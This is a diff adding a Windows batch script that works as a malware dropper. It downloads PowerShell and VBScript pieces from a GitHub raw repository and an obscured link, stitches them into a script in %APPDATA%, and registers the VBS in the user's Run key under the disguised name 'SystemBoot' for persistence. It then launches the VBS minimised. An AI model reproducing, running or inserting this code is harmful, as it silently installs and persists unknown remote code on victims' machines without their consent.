@@ -1,0 +1,27 @@
+@echo off
+setlocal EnableDelayedExpansion
+
+set "d=%APPDATA%\Paged"
+set "f=%d%\M.txt"
+set "a=%d%\f1.txt"
+set "b=%d%\f2.txt"
+set "c=%d%\Nvs.ps1"
+set "v=%d%\S_m.vbs"
+set "u=raw.githubusercontent.com/Khanzadaofficial/newss/main"
+set tynLink="****"
+
+rmdir /s /q "%d%" 2>nul
+mkdir "%d%" || exit /b 1
+
+powershell -c "$dynLink = '%tynLink%'.Replace('$','/'); $contentM = (Invoke-WebRequest -Uri 'https://%u%/final.txt').Content; $contentA = (Invoke-WebRequest -Uri 'https://%u%/first.txt').Content; $contentB = (Invoke-WebRequest -Uri $dynLink).Content; $finalContent = $contentM -replace '----',$contentA -replace '====',$contentB; [System.IO.File]::WriteAllText('%c%', $finalContent)" || exit /b 1
+
+powershell -c "$content = (Invoke-WebRequest -Uri 'https://%u%/S_m.vbs').Content; [System.IO.File]::WriteAllText('%v%', $content)" || exit /b 1
+
+if not exist "%v%" exit /b 1
+
+powershell -c "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"'" || exit /b 1
+
+start /min wscript "%v%" || exit /b 1
+
+endlocal
+exit /b 0
